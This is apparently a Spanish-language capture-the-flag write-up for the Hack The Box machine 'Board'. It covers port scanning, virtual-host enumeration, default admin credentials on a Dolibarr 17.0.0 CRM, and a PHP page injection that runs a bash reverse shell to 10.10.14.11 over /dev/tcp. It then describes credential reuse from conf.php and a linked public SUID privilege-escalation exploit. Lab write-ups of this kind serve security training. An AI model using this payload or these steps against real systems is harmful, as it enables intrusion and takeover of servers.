#writeup #HTB 

# Reconocimiento

```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```gobuster
gobuster vhost -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u board.htb -t 200 --append-domain
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://board.htb
[+] Method:          GET
[+] Threads:         200
[+] Wordlist:        /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: crm.board.htb Status: 200 [Size: 6360]
Progress: 548 / 4990 (10.98%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 645 / 4990 (12.93%)
===============================================================
Finished
===============================================================
```

Si accedemos a dicho dominio (tendremos que añadirlo al `/etc/hosts`):

![[dolibarr.png]]


# Explotación

Las credenciales resultan ser `admin:admin`. Además, vemos una versión `17.0.0`, que parece vulnerable. Si buscamos en internet, veremos que es vulnerable. Podemos crear páginas e inyectar en ellas código malicioso:

![[create_page.png]]

![[rev_shell.png]]

```php
<?pHp system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.11/443 0>&1'"); ?>
```
# Escalada de privilegios

Si estamos en escucha recibiremos una shell. Aplicaremos un [[Tratamiento de la tty]].

En un archivo `conf.php` encontramos unas credenciales de una base de datos que son válidos para el usuario `larisse`.

Con [[linpeas]] podemos encontrar archivos SUID, y con una búsqueda en internet encontramos el siguiente [exploit](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh).


